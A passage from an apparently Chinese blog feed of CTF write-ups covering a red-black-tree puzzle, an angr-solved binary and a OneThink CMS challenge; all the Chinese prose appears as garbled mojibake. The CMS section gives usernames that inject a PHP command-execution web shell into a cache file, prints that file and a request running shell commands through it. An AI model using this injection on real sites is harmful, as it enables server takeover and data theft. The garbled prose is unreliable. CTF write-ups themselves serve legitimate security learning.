class="line">        y = x.left</span><br><span class="line">        x.left = y.right</span><br><span class="line">        <span class="keyword">if</span> y.right <span class="keyword">is</span> <span class="keyword">not</span> self.nil:</span><br><span class="line">            y.right.p = x</span><br><span class="line">        y.p = x.p</span><br><span class="line">        <span class="keyword">if</span> x.p <span class="keyword">is</span> self.nil:</span><br><span class="line">            self.root = y</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> x <span class="keyword">is</span> x.p.right:</span><br><span class="line">                x.p.right = y</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                x.p.left = y</span><br><span class="line">        y.right = x</span><br><span class="line">        x.p = y</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">insert_fixup</span><span class="params">(self, z)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> z.p.color <span class="keyword">is</span> RED:</span><br><span class="line">            <span class="keyword">if</span> z.p <span class="keyword">is</span> z.p.p.left:</span><br><span class="line">                y = z.p.p.right</span><br><span class="line">                <span class="keyword">if</span> y.color <span class="keyword">is</span> RED:</span><br><span class="line">                    z.p.color = BLACK</span><br><span class="line">                    y.color = BLACK</span><br><span class="line">                    z.p.p.color = RED</span><br><span class="line">                    z = z.p.p</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> z <span class="keyword">is</span> z.p.right:</span><br><span class="line">                        z = z.p</span><br><span class="line">                        self.left_rotate(z)</span><br><span class="line">                    z.p.color = BLACK</span><br><span class="line">                    z.p.p.color = RED</span><br><span class="line">                    self.right_rotate(z.p.p)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                y = z.p.p.left</span><br><span class="line">                <span class="keyword">if</span> y.color <span class="keyword">is</span> RED:</span><br><span class="line">                    z.p.color = BLACK</span><br><span class="line">                    y.color = BLACK</span><br><span class="line">                    z.p.p.color = RED</span><br><span class="line">                    z = z.p.p</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> z <span class="keyword">is</span> z.p.left:</span><br><span class="line">                        z = z.p</span><br><span class="line">                        self.right_rotate(z)</span><br><span class="line">                    z.p.color = BLACK</span><br><span class="line">                    z.p.p.color = RED</span><br><span class="line">                    self.left_rotate(z.p.p)</span><br><span class="line">        self.root.color = BLACK</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">delete_fixup</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> (x <span class="keyword">is</span> <span class="keyword">not</span> self.root) <span class="keyword">and</span> (x.color <span class="keyword">is</span> BLACK):</span><br><span class="line">            <span class="keyword">if</span> x <span class="keyword">is</span> x.p.left:</span><br><span class="line">                w = x.p.right</span><br><span class="line">                <span class="keyword">if</span> w.color <span class="keyword">is</span> RED:</span><br><span class="line">                    w.color = BLACK</span><br><span class="line">                    x.p.color = RED</span><br><span class="line">                    self.left_rotate(x.p)</span><br><span class="line">                    w = x.p.right</span><br><span class="line">                <span class="keyword">if</span> (w.left.color <span class="keyword">is</span> BLACK) <span class="keyword">and</span> (w.right.color <span class="keyword">is</span> BLACK):</span><br><span class="line">                    w.color = RED</span><br><span class="line">                    x = x.p</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> w.right.color <span class="keyword">is</span> BLACK:</span><br><span class="line">                        w.left.color = BLACK</span><br><span class="line">                        w.color = RED</span><br><span class="line">                        self.right_rotate(w)</span><br><span class="line">                        w = x.p.right</span><br><span class="line">                    w.color = x.p.color</span><br><span class="line">                    x.p.color = BLACK</span><br><span class="line">                    w.right.color = BLACK</span><br><span class="line">                    self.left_rotate(x.p)</span><br><span class="line">                    x = self.root</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                w = x.p.left</span><br><span class="line">                <span class="keyword">if</span> w.color <span class="keyword">is</span> RED:</span><br><span class="line">                    w.color = BLACK</span><br><span class="line">                    x.p.color = RED</span><br><span class="line">                    self.right_rotate(x.p)</span><br><span class="line">                    w = x.p.left</span><br><span class="line">                <span class="keyword">if</span> (w.right.color <span class="keyword">is</span> BLACK) <span class="keyword">and</span> (w.left.color <span class="keyword">is</span> BLACK):</span><br><span class="line">                    w.color = RED</span><br><span class="line">                    x = x.p</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> w.left.color <span class="keyword">is</span> BLACK:</span><br><span class="line">                        w.right.color = BLACK</span><br><span class="line">                        w.color = RED</span><br><span class="line">                        self.left_rotate(w)</span><br><span class="line">                        w = x.p.left</span><br><span class="line">                    w.color = x.p.color</span><br><span class="line">                    x.p.color = BLACK</span><br><span class="line">                    w.left.color = BLACK</span><br><span class="line">                    self.right_rotate(x.p)</span><br><span class="line">                    x = self.root</span><br><span class="line">        x.color = BLACK</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">transplant</span><span class="params">(self, u, v)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> u.p <span class="keyword">is</span> self.nil:</span><br><span class="line">            self.root = v</span><br><span class="line">        <span class="keyword">elif</span> u <span class="keyword">is</span> u.p.left:</span><br><span class="line">            u.p.left = v</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            u.p.right = v</span><br><span class="line">        v.p = u.p</span><br></pre></td></tr></table></figure><p>è¿™æ®µçº¢é»‘æ ‘çš„æœå­ä¸ºrbnodeå¯¹è±¡ï¼Œæ•´ä¸ªæ ‘æ ¹æ®æœå­çš„keyæ„å»ºï¼Œæœå­çš„valueå¯ä»¥å¯ä»¥æ”¾æˆ‘ä»¬å­—ç¬¦ä¸²çš„å­—ç¬¦ã€‚<br>é»˜è®¤çš„çº¢é»‘æ ‘æ—¶é€šè¿‡ä¸æ–­åŠ å…¥èŠ‚ç‚¹è‡ªåŠ¨ç”Ÿæˆçš„ï¼Œä½†æ˜¯åŠ å…¥æœå­çš„é¡ºåºä¸åŒä¼šé€ æˆæ ‘ä»¥åŠæœå­çš„é¢œè‰²çš„ä¸åŒï¼Œå¯ä»¥çœ‹åˆ°æˆ‘å¯¹æ ‡å‡†çš„çº¢é»‘æ ‘æ„é€ å‡½æ•°åšäº†ä¿®æ”¹ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥æ ¹æ®ç»™å‡ºçš„å›¾ç‰‡ï¼ˆ1.jpgï¼‰æ„é€ ä¸€ä¸ªçº¢é»‘æ ‘ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="comment">#æç¤º2ï¼Œæœå­çš„value</span></span><br><span class="line">    _str=<span class="string">" ek`~3c:gf017b744/b38fd~abm7g5489e2&#123;lf6z8d16hae`98&#125;b|-21m.e:"</span></span><br><span class="line"></span><br><span class="line">    nodes=[_NONE]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">        nodes.append( rbnode(key=i,value=_str[i]) )</span><br><span class="line">        <span class="comment"># node, color, l,r,p</span></span><br><span class="line">    <span class="comment"># å½•å…¥å›¾ç‰‡çº¢é»‘æ ‘çš„ä¿¡æ¯</span></span><br><span class="line">    tree=[</span><br><span class="line">            [<span class="number">1</span>,BLACK,<span class="number">0</span>,<span class="number">2</span>,<span class="number">3</span>],</span><br><span class="line">            [<span class="number">2</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>],</span><br><span class="line">            [<span class="number">3</span>,RED,<span class="number">1</span>,<span class="number">4</span>,<span class="number">6</span>],</span><br><span class="line">            [<span class="number">4</span>,BLACK,<span class="number">0</span>,<span class="number">5</span>,<span class="number">3</span>],</span><br><span class="line">            [<span class="number">5</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">4</span>],</span><br><span class="line">            [<span class="number">6</span>,BLACK,<span class="number">3</span>,<span class="number">8</span>,<span class="number">10</span>],</span><br><span class="line">            [<span class="number">7</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>],</span><br><span class="line">            [<span class="number">8</span>,BLACK,<span class="number">7</span>,<span class="number">9</span>,<span class="number">6</span>],</span><br><span class="line">            [<span class="number">9</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>],</span><br><span class="line">            [<span class="number">10</span>,RED,<span class="number">6</span>,<span class="number">18</span>,<span class="number">23</span>],</span><br><span class="line">            [<span class="number">11</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">12</span>],</span><br><span class="line">            [<span class="number">12</span>,BLACK,<span class="number">11</span>,<span class="number">13</span>,<span class="number">14</span>],</span><br><span class="line">            [<span class="number">13</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">12</span>],</span><br><span class="line">            [<span class="number">14</span>,RED,<span class="number">12</span>,<span class="number">16</span>,<span class="number">18</span>],</span><br><span class="line">            [<span class="number">15</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">16</span>],</span><br><span class="line">            [<span class="number">16</span>,BLACK,<span class="number">15</span>,<span class="number">17</span>,<span class="number">14</span>],</span><br><span class="line">            [<span class="number">17</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">16</span>],</span><br><span class="line">            [<span class="number">18</span>,BLACK,<span class="number">14</span>,<span class="number">20</span>,<span class="number">10</span>],</span><br><span class="line">            [<span class="number">19</span>,BLACK,<span class="number">0</span>,<span class="number">0</span>,<span class="number">20</span>],</span><br><span class="line">            [<span class="number">20</span>,RED,<span class="number">19</span>,<span class="number">21</span>,<span class="number">18</span>],</span><br><span class="line">            [<span class="number">21</span>,BLACK,<span class="number">0</span>,<span class="number">22</span>,<span class="number">20</span>],</span><br><span class="line">            [<span class="number">22</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">21</span>],</span><br><span class="line">            [<span class="number">23</span>,BLACK,<span class="number">10</span>,<span class="number">26</span>,<span class="number">28</span>],</span><br><span class="line">            [<span class="number">24</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">25</span>],</span><br><span class="line">            [<span class="number">25</span>,BLACK,<span class="number">24</span>,<span class="number">0</span>,<span class="number">26</span>],</span><br><span class="line">            [<span class="number">26</span>,BLACK,<span class="number">25</span>,<span class="number">27</span>,<span class="number">23</span>],</span><br><span class="line">            [<span class="number">27</span>,BLACK,<span class="number">0</span>,<span class="number">0</span>,<span class="number">26</span>],</span><br><span class="line">            [<span class="number">28</span>,BLACK,<span class="number">23</span>,<span class="number">43</span>,<span class="number">0</span>],</span><br><span class="line">            [<span class="number">29</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">30</span>],</span><br><span class="line">            [<span class="number">30</span>,BLACK,<span class="number">29</span>,<span class="number">31</span>,<span class="number">32</span>],</span><br><span class="line">            [<span class="number">31</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">30</span>],</span><br><span class="line">            [<span class="number">32</span>,BLACK,<span class="number">30</span>,<span class="number">34</span>,<span class="number">35</span>],</span><br><span class="line">            [<span class="number">33</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">34</span>],</span><br><span class="line">            [<span class="number">34</span>,BLACK,<span class="number">33</span>,<span class="number">0</span>,<span class="number">32</span>],</span><br><span class="line">            [<span class="number">35</span>,RED,<span class="number">32</span>,<span class="number">37</span>,<span class="number">43</span>],</span><br><span class="line">            [<span class="number">36</span>,BLACK,<span class="number">0</span>,<span class="number">0</span>,<span class="number">37</span>],</span><br><span class="line">            [<span class="number">37</span>,BLACK,<span class="number">36</span>,<span class="number">40</span>,<span class="number">35</span>],</span><br><span class="line">            [<span class="number">38</span>,BLACK,<span class="number">0</span>,<span class="number">39</span>,<span class="number">40</span>],</span><br><span class="line">            [<span class="number">39</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">38</span>],</span><br><span class="line">            [<span class="number">40</span>,RED,<span class="number">38</span>,<span class="number">41</span>,<span class="number">37</span>],</span><br><span class="line">            [<span class="number">41</span>,BLACK,<span class="number">0</span>,<span class="number">42</span>,<span class="number">40</span>],</span><br><span class="line">            [<span class="number">42</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">41</span>],</span><br><span class="line">            [<span class="number">43</span>,BLACK,<span class="number">35</span>,<span class="number">53</span>,<span class="number">28</span>],</span><br><span class="line">            [<span class="number">44</span>,BLACK,<span class="number">0</span>,<span class="number">0</span>,<span class="number">45</span>],</span><br><span class="line">            [<span class="number">45</span>,RED,<span class="number">44</span>,<span class="number">46</span>,<span class="number">48</span>],</span><br><span class="line">            [<span class="number">46</span>,BLACK,<span class="number">0</span>,<span class="number">47</span>,<span class="number">45</span>],</span><br><span class="line">            [<span class="number">47</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">46</span>],</span><br><span class="line">            [<span class="number">48</span>,BLACK,<span class="number">45</span>,<span class="number">50</span>,<span class="number">53</span>],</span><br><span class="line">            [<span class="number">49</span>,BLACK,<span class="number">0</span>,<span class="number">0</span>,<span class="number">50</span>],</span><br><span class="line">            [<span class="number">50</span>,RED,<span class="number">49</span>,<span class="number">51</span>,<span class="number">48</span>],</span><br><span class="line">            [<span class="number">51</span>,BLACK,<span class="number">0</span>,<span class="number">52</span>,<span class="number">50</span>],</span><br><span class="line">            [<span class="number">52</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">51</span>],</span><br><span class="line">            [<span class="number">53</span>,RED,<span class="number">48</span>,<span class="number">57</span>,<span class="number">43</span>],</span><br><span class="line">            [<span class="number">54</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">55</span>],</span><br><span class="line">            [<span class="number">55</span>,BLACK,<span class="number">54</span>,<span class="number">56</span>,<span class="number">57</span>],</span><br><span class="line">            [<span class="number">56</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">55</span>],</span><br><span class="line">            [<span class="number">57</span>,BLACK,<span class="number">55</span>,<span class="number">59</span>,<span class="number">53</span>],</span><br><span class="line">            [<span class="number">58</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">59</span>],</span><br><span class="line">            [<span class="number">59</span>,BLACK,<span class="number">58</span>,<span class="number">0</span>,<span class="number">57</span>],</span><br><span class="line">            ]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(tree)):</span><br><span class="line">        nodes[tree[i][<span class="number">0</span>]].color=tree[i][<span class="number">1</span>]</span><br><span class="line">        nodes[tree[i][<span class="number">0</span>]].left=nodes[tree[i][<span class="number">2</span>]]</span><br><span class="line">        nodes[tree[i][<span class="number">0</span>]].right=nodes[tree[i][<span class="number">3</span>]]</span><br><span class="line">        nodes[tree[i][<span class="number">0</span>]].p=nodes[tree[i][<span class="number">4</span>]]</span><br><span class="line">    <span class="comment"># æ‰“å°äºŒå‰æ ‘</span></span><br><span class="line">    tr=rbtree(nodes=nodes)</span><br><span class="line">    print(tr)</span><br></pre></td></tr></table></figure><p><strong>å¤‡æ³¨ï¼š</strong></p><p>è¿™çœŸçš„æ˜¯ä¸€ä¸ªçº¢é»‘æ ‘çš„ä¸€ä¸ªå¾ˆå¥½çš„å®ç°ï¼Œè¿˜å¯ä»¥å¯è§†åŒ–çš„æ‰“å°æ•´æ£µæ ‘ï¼Œè¿™é‡Œç»™å‡ºæ­£å¸¸çš„æ„é€ æ ‘çš„æ–¹æ³•ï¼Œåªéœ€ç»™å‡ºæœå­çš„keyå’Œvalueï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    tr=rbtree(data=&#123;<span class="string">'1'</span>:<span class="string">'1'</span>,<span class="string">'2'</span>:<span class="string">'2'</span>&#125;.items())</span><br><span class="line">    print(tr)</span><br></pre></td></tr></table></figure><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>æ ¹æ®æç¤º3ï¼Œä»æ ‘ä¸Šå–èµ°ç¬¬ 18,35,53,50,14,28,19,6,54,36 ä¸ªæœå­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">18</span>,<span class="number">35</span>,<span class="number">53</span>,<span class="number">50</span>,<span class="number">14</span>,<span class="number">28</span>,<span class="number">19</span>,<span class="number">6</span>,<span class="number">54</span>,<span class="number">36</span>]:</span><br><span class="line">    tr.delete(tr.force_search(i))</span><br></pre></td></tr></table></figure><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>æ ¹æ®æç¤º4å’Œ5ï¼Œè·å–ç¬¬[8,56,47,37,52,34,17,8,8,29,7,47,40,57,46,24,34,34,57,29,22,5,16,57,24,29,8,12,57,12,12,21,33,34,55,51,22,45,34,31,1,23]æœå­çš„å€¼ï¼Œå¹¶ä¸”æŒ‰ç…§é¢œè‰²å¯¹å…¶ascii+1æˆ–-1ï¼Œå³å¯å¾—åˆ°flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">8</span>,<span class="number">56</span>,<span class="number">47</span>,<span class="number">37</span>,<span class="number">52</span>,<span class="number">34</span>,<span class="number">17</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">29</span>,<span class="number">7</span>,<span class="number">47</span>,<span class="number">40</span>,<span class="number">57</span>,<span class="number">46</span>,<span class="number">24</span>,<span class="number">34</span>,<span class="number">34</span>,<span class="number">57</span>,<span class="number">29</span>,<span class="number">22</span>,<span class="number">5</span>,<span class="number">16</span>,<span class="number">57</span>,<span class="number">24</span>,<span class="number">29</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">57</span>,<span class="number">12</span>,<span class="number">12</span>,<span class="number">21</span>,<span class="number">33</span>,<span class="number">34</span>,<span class="number">55</span>,<span class="number">51</span>,<span class="number">22</span>,<span class="number">45</span>,<span class="number">34</span>,<span class="number">31</span>,<span class="number">1</span>,<span class="number">23</span>]:</span><br><span class="line">    node=tr.force_search(i)</span><br><span class="line">    <span class="keyword">if</span> node.color==BLACK:</span><br><span class="line">        s+=chr(ord(node.value)<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s+=chr(ord(node.value)+<span class="number">1</span>)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure><p>ç®—å‡ºflagä¸ºï¼š<br>flag{10ff49a7-db11-4e43-b4f6-66ef12ceb19d}</p><h1 id="martricks"><a href="#martricks" class="headerlink" title="martricks"></a>martricks</h1><p>åˆšæ‹¿åˆ°è¿™é¢˜å°±æ„Ÿè§‰è·Ÿç¬¦å·æ‰§è¡Œæœ‰å…³ç³»ï¼Œå¯æƒœæ²¡æœ‰è´¯å½»æ€æƒ³ç»§ç»­åšä¸‹å»ï¼Œä¸è¿‡è§£æ³•è›®ç®€å•çš„ï¼Œè¿™é‡Œç®€å•è®°å½•ä¸€ä¸‹ï¼Œä¹Ÿæ˜¯å½“å­¦ä¹ ä¸€ä¸‹angrå§ï¼š</p><h2 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h2><p>æ‹¿åˆ°é¢˜ç›®idaæ‰“å¼€ï¼Œå¤§æ¦‚F5çœ‹ä¸€ä¸‹ï¼Œæœ‰ä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æœç­‰äº0å°±congratså¦åˆ™wrongï¼Œé‚£ä¹ˆè®°ä¸‹è¿™ä¸¤å¤„å­—ç¬¦ä¸²çš„åœ°å€ã€‚</p><p><img src="/ctf-2018ç½‘é¼æ¯äºŒå‰æ ‘-martrickswp/1535025943800.png" alt="1535025943800"></p><h2 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h2><p>æ¥ä¸‹æ¥å°±å¯ä»¥ç”¨angrè°ƒç”¨è¯¥æ–‡ä»¶ï¼Œæ ¹æ®ç¬¦å·æ‰§è¡Œè®©æˆ‘ä»¬æ‰§è¡Œåˆ°400A84åœ°å€ï¼Œå…¶ä¸­é¿å…ç»è¿‡400A90åœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">angr_example</span><span class="params">()</span>:</span></span><br><span class="line">    p = angr.Project(<span class="string">"./martricks"</span>)</span><br><span class="line">    simgr = p.factory.simulation_manager(p.factory.full_init_state())</span><br><span class="line">    simgr.explore(find=<span class="number">0x400A84</span>, avoid=<span class="number">0x400A90</span>)  <span class="comment"># æˆåŠŸè·¯å¾„ï¼Œå¤±è´¥è·¯å¾„</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>).strip(<span class="string">'\0\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">print</span> angr_example()</span><br></pre></td></tr></table></figure><p>ç­‰å¾…ä¸€ä¼šåå¾—åˆ°flagï¼š</p><p>flag{Everyth1n_th4t_kill5_m3_m4kes_m3_fee1_aliv3}</p><p><strong>æ³¨ï¼š</strong> æ‰€æœ‰ç¨‹åºé¢˜ç›®å·²ç»ä¸Šä¼ è‡³GitHubï¼š<a href="https://github.com/Anemone95/ctf_wp/tree/master/wangding2018" target="_blank" rel="noopener">https://github.com/Anemone95/ctf_wp/tree/master/wangding2018</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> äºŒå‰æ ‘ </tag>
            
            <tag> ç¬¦å·æ‰§è¡Œ </tag>
            
            <tag> angr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹ â€œå·…å³°æå®¢â€ CTF A Simple CMS&amp;loli WP</title>
      <link href="/ctf-i%E6%98%A5%E7%A7%8B%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2CTF-A-Simple-CMS-loli-WP/"/>
      <url>/ctf-i%E6%98%A5%E7%A7%8B%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2CTF-A-Simple-CMS-loli-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="A-Simple-CMS"><a href="#A-Simple-CMS" class="headerlink" title="A Simple CMS"></a>A Simple CMS</h1><p>çœ‹åˆ°ç½‘ç«™æ˜¯OneThinkåšçš„ï¼Œç™¾åº¦æœäº†ä¸‹è¯¥CMSå­˜åœ¨<a href="https://www.secpulse.com/archives/55862.html" target="_blank" rel="noopener">æ¼æ´</a>ï¼Œå‚è€ƒæ–‡ç« è¿‡ç¨‹å³å¯å¾—åˆ°flagã€‚ä½†æ˜¯å…¶ä¸­çš„ç¼“å­˜æ–‡ä»¶åšäº†ä¿®æ”¹ï¼Œéœ€è¦åœ¨æœ¬åœ°å¤ç°ä¸€ä¸‹ï¼Œç¡®å®šç¼“å­˜æ–‡ä»¶åã€‚</p><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>æ‰«æç½‘ç«™æ•æ„Ÿç›®å½•ï¼Œå‘ç°<code>www.zip</code>æ–‡ä»¶ï¼š</p><p><img src="/ctf-iæ˜¥ç§‹å·…å³°æå®¢CTF-A-Simple-CMS-loli-WP/www.zip.png" alt="www.zip"></p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>ä¸‹è½½æ–‡ä»¶ï¼Œåœ¨æœ¬åœ°æ„å»ºå¤ç°ç¯å¢ƒï¼Œé¦–å…ˆåˆ é™¤<code>onethink/onethink/Application/Install/Data/install.lock</code>æ–‡ä»¶ï¼Œç„¶åè®¿é—®<code>install.php</code>ã€‚</p><a id="more"></a><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>ä¾æ¬¡ä½¿ç”¨<code>%0a$a=$_GET[a];//</code> å’Œ <code>%0aecho &#96;$a&#96;;//</code> æ³¨å†Œè´¦å·ï¼Œåœ¨ä¾æ¬¡ç™»å½•è´¦å·ï¼Œå‘ç°å­˜åœ¨<code>Runtime/Temp/onethink_d403acece4ebce56a3a4237340fbbe70.php</code>æ–‡ä»¶ï¼Œä¸”æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//000000000000a:4:&#123;s:2:"u1";s:13:"Administrator";s:2:"u3";s:6:"test12";s:2:"u4";s:15:"</span></span><br><span class="line">$a=$_GET[a];<span class="comment">//";s:2:"u5";s:13:"</span></span><br><span class="line"><span class="keyword">echo</span> `$a`;<span class="comment">//";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¯´æ˜æˆ‘ä»¬çš„ä¸€å¥è¯ä¸Šä¼ æˆåŠŸï¼Œæ–‡ä»¶åä¸º<code>Runtime/Temp/onethink_d403acece4ebce56a3a4237340fbbe70.php</code>ï¼Œè¯¥æ–‡ä»¶åä¸æ”¹å˜ã€‚</p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>åœ¨æœåŠ¡å™¨ä¸Šé‡å¤æ­¥éª¤2ï¼Œgetshell</p><p><img src="/ctf-iæ˜¥ç§‹å·…å³°æå®¢CTF-A-Simple-CMS-loli-WP/getshell.png" alt="getshell"></p><p>åœ¨tmpç›®å½•ä¸‹è·å–flagï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ddd27aa160354000ba7eba4b621e08cd9274bde410054da1.game.ichunqiu.com/Runtime/Temp/onethink_d403acece4ebce56a3a4237340fbbe70.php?a=cat%20/tmp/flag</span><br></pre></td></tr></table></figure></p><h1 id="loli"><a href="#loli" class="headerlink" title="loli"></a>loli</h1><h2 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h2><p>å›¾ç‰‡ä¸‹è½½ä¸‹æ¥ï¼Œæ ¹æ®é¢˜ç›®hintï¼ˆ0xFFï¼‰ï¼Œæƒ³åˆ°ä½¿ç”¨0xFFå¼‚æˆ–æ•´ä¸ªæ–‡ä»¶ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span 